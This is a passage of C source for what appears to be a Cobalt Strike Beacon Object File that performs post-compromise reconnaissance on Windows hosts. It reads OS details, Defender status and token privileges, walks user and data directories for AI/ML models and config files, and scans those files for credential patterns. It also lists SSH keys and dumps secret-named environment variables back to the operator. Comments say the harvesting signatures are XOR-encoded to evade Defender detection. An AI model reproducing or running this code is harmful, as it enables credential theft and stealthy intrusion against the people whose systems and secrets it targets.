                    &vt, (LPBYTE)wv, &vlen) == ERROR_SUCCESS)
                w2a(wv, prod, sizeof(prod));

            vlen = sizeof(wv);
            if (ADVAPI32$RegQueryValueExW(hOS, L"CurrentBuild", NULL,
                    &vt, (LPBYTE)wv, &vlen) == ERROR_SUCCESS)
                w2a(wv, build, sizeof(build));

            vlen = sizeof(wv);
            if (ADVAPI32$RegQueryValueExW(hOS, L"DisplayVersion", NULL,
                    &vt, (LPBYTE)wv, &vlen) == ERROR_SUCCESS)
                w2a(wv, disp, sizeof(disp));

            BeaconPrintf(CALLBACK_OUTPUT, "  OS     : %s (build %s, %s)\n",
                         prod, build, disp);
            ADVAPI32$RegCloseKey(hOS);
        }
    }

    // Defender real-time protection state
    {
        char dFmt[64], dUnk[80], dAbs[80], dDis[40], dEn[40];
        xdec(dFmt, E_DEF_FMT, E_DEF_FMT_LEN);
        xdec(dUnk, E_DEF_UNKNOWN, E_DEF_UNKNOWN_LEN);
        xdec(dAbs, E_DEF_ABSENT, E_DEF_ABSENT_LEN);
        xdec(dDis, E_DEF_DIS, E_DEF_DIS_LEN);
        xdec(dEn,  E_DEF_EN,  E_DEF_EN_LEN);
        static wchar_t wRegKey[80], wRegVal[40];
        xdec_w(wRegKey, E_DEF_REGKEY, E_DEF_REGKEY_LEN);
        xdec_w(wRegVal, E_DEF_REGVAL, E_DEF_REGVAL_LEN);
        HKEY hDef = NULL;
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                wRegKey, 0, KEY_READ, &hDef) == ERROR_SUCCESS) {
            DWORD rt = 0, vt, vlen = sizeof(rt);
            if (ADVAPI32$RegQueryValueExW(hDef, wRegVal,
                    NULL, &vt, (LPBYTE)&rt, &vlen) == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT, dFmt, rt ? dDis : dEn);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, dUnk);
            }
            ADVAPI32$RegCloseKey(hDef);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, dAbs);
        }
    }

    // Token privileges
    {
        HANDLE hTok = NULL;
        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                TOKEN_QUERY, &hTok)) {
            DWORD retLen = 0;
            ADVAPI32$GetTokenInformation(hTok, BOF_TOKEN_PRIVILEGES,
                NULL, 0, &retLen);
            if (retLen > 0) {
                LPBYTE tb = (LPBYTE)KERNEL32$HeapAlloc(
                    KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, retLen);
                if (tb &&
                    ADVAPI32$GetTokenInformation(hTok, BOF_TOKEN_PRIVILEGES,
                        tb, retLen, &retLen)) {
                    DWORD count = *(DWORD*)tb;
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "  Privileges (%lu):\n", count);
                    // LUID_AND_ATTRIBUTES stride = 12 (LUID 8 + DWORD 4)
                    DWORD max = count > 40 ? 40 : count;
                    for (DWORD i = 0; i < max; i++) {
                        BYTE* pe = tb + 4 + i * 12;
                        LUID luid;
                        luid.LowPart  = *(DWORD*)(pe + 0);
                        luid.HighPart = *(LONG*)(pe + 4);
                        DWORD attr    = *(DWORD*)(pe + 8);
                        wchar_t wname[128];
                        DWORD nlen = 128;
                        if (ADVAPI32$LookupPrivilegeNameW(NULL, &luid,
                                wname, &nlen)) {
                            char an[128];
                            w2a(wname, an, sizeof(an));
                            BeaconPrintf(CALLBACK_OUTPUT, "    %-28s %s\n",
                                an,
                                (attr & BOF_SE_PRIVILEGE_ENABLED) ? "ENABLED" : "disabled");
                        }
                    }
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tb);
                }
            }
            KERNEL32$CloseHandle(hTok);
        }
    }
}

// ─── SECTION 10: AI/ML ARTIFACTS & CONFIG SECRETS ───────────────────────────

// secret signature tables are XOR(0x5C)-encoded in osai_enc.h (E_PREFIX /
// E_KEYWORD) so the credential-harvesting patterns do not appear as plaintext
// in the COFF image (Defender real-time flags plaintext sk-/password=/-----
// BEGIN / mongodb:// / connection_string / ... and kills the beacon on BOF
// load). Decoded at runtime into stack buffers only for the in-memory compare.
static int g_aiFilesScanned = 0;
static int g_aiHitsPrinted = 0;

// lazily-decoded secret-signature arrays (XOR'd blobs -> runtime stack/static bufs)
static char  g_preBuf[E_PREFIX_COUNT][40];
static char* g_prePtr[E_PREFIX_COUNT + 1];
static char  g_kwBuf[E_KEYWORD_COUNT][40];
static char* g_kwPtr[E_KEYWORD_COUNT + 1];
static int   g_sigsBuilt = 0;

static void ensureSigs(void) {
    if (g_sigsBuilt) return;
    buildAscii(g_prePtr, g_preBuf, E_PREFIX,  E_PREFIX_LEN,  E_PREFIX_COUNT);
    buildAscii(g_kwPtr,  g_kwBuf,  E_KEYWORD, E_KEYWORD_LEN, E_KEYWORD_COUNT);
    g_sigsBuilt = 1;
}

// decoded output labels (avoid re-decoding per file in the recursive walk)
static char L_aiDir[24], L_model[24], L_cfg[24], L_ssh[16], L_sshSys[16];
static int  g_labelsBuilt = 0;
static void ensureLabels(void) {
    if (g_labelsBuilt) return;
    xdec(L_aiDir, E_LBL_AI_DIR, E_LBL_AI_DIR_LEN);
    xdec(L_model, E_LBL_MODEL,  E_LBL_MODEL_LEN);
    xdec(L_cfg,   E_LBL_CFG,    E_LBL_CFG_LEN);
    xdec(L_ssh,   E_LBL_SSH,    E_LBL_SSH_LEN);
    xdec(L_sshSys,E_LBL_SSHSYS, E_LBL_SSHSYS_LEN);
    g_labelsBuilt = 1;
}

// require >= 16 non-ws bytes after the prefix (cuts DLL/string-table noise)
static int sig_tail_ok(const char* buf, int len, int pos, int sigLen) {
    if (sigLen >= 5 && buf[pos] == '-' && buf[pos + 1] == '-') return 1; // PEM header
    int j = pos + sigLen, cnt = 0;
    while (j < len && cnt < 16) {
        char c = buf[j];
        if (c == 0 || c == ' ' || c == '\t' || c == '\r' || c == '\n' ||
            c == '"' || c == '\'' || c == '<' || c == ',' || c == '}' ||
            c == ']' || c == ')' || c == ';' || c == '&' || c == '|')
            break;
        cnt++; j++;
    }
    return cnt >= 16;
}

static void print_secret_hit(const char* apath, const char* sig,
                             const char* buf, int len, int pos) {
    char ctx[65];
    int n = 0;
    for (int j = pos; j < len && n < 64; j++) {
        char c = buf[j];
        ctx[n++] = (c >= 32 && c < 127) ? c : '.';
    }
    ctx[n] = 0;
    char fmt[80];
    xdec(fmt, E_FMT_SECRET, E_FMT_SECRET_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, fmt, apath, sig, ctx);
}

// Open a small text config and scan for secret signatures. Capped per file.
static void scan_file_secrets(const wchar_t* wpath, const char* apath) {
    if (g_aiHitsPrinted >= 200) return;
    if (g_aiFilesScanned >= 300) return;
    g_aiFilesScanned++;

    HANDLE h = KERNEL32$CreateFileW(wpath, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    DWORD fsize = KERNEL32$GetFileSize(h, NULL);
    if (fsize == INVALID_FILE_SIZE || fsize == 0) {
        KERNEL32$CloseHandle(h);
        return;
    }
    // only scan small text configs
    DWORD toRead = fsize > 65536 ? 65536 : fsize;

    char* buf = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, toRead);
    if (!buf) {
        KERNEL32$CloseHandle(h);
        return;
    }

    DWORD got = 0;
    if (KERNEL32$ReadFile(h, buf, toRead, &got, NULL) && got > 0) {
        ensureSigs();
        int hits = 0;
        for (DWORD i = 0; i < got && hits < 6 && g_aiHitsPrinted < 200; i++) {
            int matched = 0;
            for (int s = 0; g_prePtr[s] && !matched; s++) {
                const char* sig = g_prePtr[s];
                int sl = (int)MSVCRT$strlen(sig);
                if ((int)i + sl <= (int)got &&
                    MSVCRT$memcmp(buf + i, sig, sl) == 0 &&
                    sig_tail_ok(buf, (int)got, (int)i, sl)) {
                    print_secret_hit(apath, sig, buf, (int)got, (int)i);
                    matched = 1;
                }
            }
            if (!matched) {
                for (int s = 0; g_kwPtr[s] && !matched; s++) {
                    const char* sig = g_kwPtr[s];
                    int sl = (int)MSVCRT$strlen(sig);
                    if ((int)i + sl <= (int)got &&
                        MSVCRT$memcmp(buf + i, sig, sl) == 0) {
                        print_secret_hit(apath, sig, buf, (int)got, (int)i);
                        matched = 1;
                    }
                }
            }
            if (matched) { hits++; g_aiHitsPrinted++; }
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buf);
    KERNEL32$CloseHandle(h);
}

// AI/ML model file extensions
static const wchar_t* AI_MODEL_EXTS[] = {
    L".pt", L".pth", L".pkl", L".ckpt", L".safetensors", L".onnx", L".h5",
    L".model", L".gguf", L".tflite", L".pb", L".npy", L".npz", L".joblib",
    L".keras", L".bin", L".pmml", L".mlmodel", NULL
};
// text config extensions to content-scan
static const wchar_t* AI_SCAN_EXTS[] = {
    L".env", L".yml", L".yaml", L".json", L".cfg", L".ini",
    L".conf", L".toml", L".properties", NULL
};
// exact config filenames to content-scan
static const wchar_t* AI_SCAN_NAMES[] = {
    L"config.json", L"docker-compose.yml", L"docker-compose.yaml",
    L"requirements.txt", L"Dockerfile", L"Modelfile", L"models.yaml",
    L"settings.json", L"appsettings.json", L"pipeline.yaml", L"config.yaml",
    L"config.yml", L".env", L"secrets.env", L"huggingface", NULL
};
// AI-tool directory names (label + still recurse into them)
static const wchar_t* AI_DIR_NAMES[] = {
    L"mlruns", L"mlflow", L"ollama", L"langflow", L"n8n", L"chroma",
    L"qdrant", L"weaviate", L"milvus", L"models", L"artifacts",
    L"huggingface", L"torch", L"tensorflow", L"kubeflow", L"airflow",
    L"jupyter", L"notebooks", L"checkpoints", L"wandb", L"tensorboard",
    L"datasets", L".ollama", L".cache", L"minio", L"registry", NULL
};

// Recursive AI-artifact walk. doScan=1 opens text configs for secret scan
// (use 0 under very large trees like Program Files).
static void searchAiFilesRec(const wchar_t* dir, int depth, int maxDepth,
                             int doScan) {
    if (depth > maxDepth) return;
    if (g_aiFilesScanned >= 300) return;

    wchar_t pattern[MAX_PATH];
    MSVCRT$wcscpy(pattern, dir);
    MSVCRT$wcscat(pattern, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t fullPath[MAX_PATH];
        MSVCRT$wcscpy(fullPath, dir);
        MSVCRT$wcscat(fullPath, L"\\");
        MSVCRT$wcscat(fullPath, fd.cFileName);

        char aBuf[MAX_PATH * 2];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (matchExact(fd.cFileName, AI_DIR_NAMES)) {
                w2a(fullPath, aBuf, sizeof(aBuf));
                BeaconPrintf(CALLBACK_OUTPUT, L_aiDir, aBuf);
            }
            searchAiFilesRec(fullPath, depth + 1, maxDepth, doScan);
        } else {
            if (matchExt(fd.cFileName, AI_MODEL_EXTS)) {
                w2a(fullPath, aBuf, sizeof(aBuf));
                BeaconPrintf(CALLBACK_OUTPUT, L_model, aBuf);
            } else if (doScan &&
                       (matchExt(fd.cFileName, AI_SCAN_EXTS) ||
                        matchExact(fd.cFileName, AI_SCAN_NAMES))) {
                w2a(fullPath, aBuf, sizeof(aBuf));
                BeaconPrintf(CALLBACK_OUTPUT, L_cfg, aBuf);
                scan_file_secrets(fullPath, aBuf);
            }
        }
    } while (KERNEL32$FindNextFileW(hFind, &fd) && g_aiFilesScanned < 300);

    KERNEL32$FindClose(hFind);
}

static void aiArtifactsAndSecrets(void) {
    char b10[200];
    xdec(b10, E_BANNER_10, E_BANNER_10_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, b10);
    ensureLabels();

    // deep scan under user + data roots
    searchAiFilesRec(L"C:\\Users",       0, 6, 1);
    searchAiFilesRec(L"C:\\ProgramData", 0, 5, 1);
    searchAiFilesRec(L"C:\\opt",         0, 5, 1);
    searchAiFilesRec(L"C:\\AI",          0, 5, 1);
    searchAiFilesRec(L"C:\\ML",          0, 5, 1);
    // list-only (no content scan) under Program Files to avoid noise
    searchAiFilesRec(L"C:\\Program Files",      0, 4, 0);
    searchAiFilesRec(L"C:\\Program Files (x86)", 0, 4, 0);

    char sum[80];
    xdec(sum, E_SCAN_SUM, E_SCAN_SUM_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, sum, g_aiFilesScanned, g_aiHitsPrinted);
}

// ─── SECTION 11: AI/ML LISTENING SERVICES ────────────────────────────────────

static void aiListeningServices(void) {
    char b11[200];
    xdec(b11, E_BANNER_11, E_BANNER_11_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, b11);
    enumPorts(1);
}

// ─── SECTION 12: SSH KEYS + ENV SECRETS ─────────────────────────────────────

// env-needle names are XOR(0x5C)-encoded in osai_enc.h (E_ENV) — the plaintext
// tokens TOKEN/KEY/SECRET/PASSWORD/VAULT/CREDENTIAL/AWS/... are exactly what
// Defender matches as credential-harvesting tooling. Decoded once at runtime.
static wchar_t  g_envBuf[E_ENV_COUNT][32];
static wchar_t* g_envPtr[E_ENV_COUNT + 1];
static int      g_envBuilt = 0;
static void ensureEnv(void) {
    if (g_envBuilt) return;
    buildWide(g_envPtr, g_envBuf, E_ENV, E_ENV_LEN, E_ENV_COUNT);
    g_envBuilt = 1;
}

static void sshAndEnvSecrets(void) {
    char b12[120];
    xdec(b12, E_BANNER_12, E_BANNER_12_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, b12);
    ensureLabels();

    // per-user .ssh
    WIN32_FIND_DATAW fd;
    HANDLE hUsers = KERNEL32$FindFirstFileW(L"C:\\Users\\*", &fd);
    if (hUsers != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
                MSVCRT$wcscmp(fd.cFileName, L"..") == 0 ||
                MSVCRT$_wcsicmp(fd.cFileName, L"Public") == 0 ||
                MSVCRT$_wcsicmp(fd.cFileName, L"Default") == 0)
                continue;

            wchar_t sshDir[MAX_PATH];
            MSVCRT$wcscpy(sshDir, L"C:\\Users\\");
            MSVCRT$wcscat(sshDir, fd.cFileName);
            MSVCRT$wcscat(sshDir, L"\\.ssh");
            listFilesIn(sshDir, L_ssh);
        } while (KERNEL32$FindNextFileW(hUsers, &fd));
        KERNEL32$FindClose(hUsers);
    }

    // system-wide OpenSSH host keys + admin authorized_keys + sshd_config
    listFilesIn(L"C:\\ProgramData\\ssh", L_sshSys);

    // environment variables matching secret-ish names
    char envHdr[40];
    xdec(envHdr, E_ENV_HDR, E_ENV_HDR_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, envHdr);
    LPWSTR env = KERNEL32$GetEnvironmentStringsW();
    if (!env) {
        char ef[64];
        xdec(ef, E_ENV_FAIL, E_ENV_FAIL_LEN);
        BeaconPrintf(CALLBACK_OUTPUT, ef);
        return;
    }
    ensureEnv();
    char fmtEnv[40];
    xdec(fmtEnv, E_FMT_ENV, E_FMT_ENV_LEN);
    LPWSTR p = env;
    int envHits = 0;
    while (*p && envHits < 60) {
        // find '='
        LPWSTR q = p;
        while (*q && *q != L'=') q++;
        if (*q != L'=') {
            while (*p) p++; p++;
            continue;
        }
        int nameLen = (int)(q - p);
        LPWSTR val = q + 1;

        if (nameLen > 0 && nameLen < 256) {
            int matched = 0;
            for (int i = 0; g_envPtr[i] && !matched; i++) {
                if (wcs_contains_ci(p, nameLen, g_envPtr[i])) matched = 1;
            }
            if (matched) {
                wchar_t nm[128];
                int n = nameLen < 127 ? nameLen : 127;
                MSVCRT$memcpy(nm, p, n * sizeof(wchar_t));
                nm[n] = 0;
                char aName[160], aVal[300];
                w2a(nm, aName, sizeof(aName));
                w2a(val, aVal, sizeof(aVal));
                aVal[260] = 0; // truncate long values
                BeaconPrintf(CALLBACK_OUTPUT, fmtEnv, aName, aVal);
                envHits++;
            }
        }

        // advance past this var
        while (*p) p++; p++;
    }
    KERNEL32$FreeEnvironmentStringsW(env);
}

// ─── ENTRY POINT ─────────────────────────────────────────────────────────────

void go(char* args, int len) {
    char title[200];
    xdec(title, E_TITLE, E_TITLE_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, title);

    enumShares();
    searchInterestingFiles();
    listDirectories();
    findFlags();
    enumListeningPorts();
    checkIISWrite();
    findStickyAndHistory();
    enumServices();
    systemAndDefenses();
    aiArtifactsAndSecrets();
    aiListeningServices();
    sshAndEnvSecrets();

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] Enumeration complete.\n");
}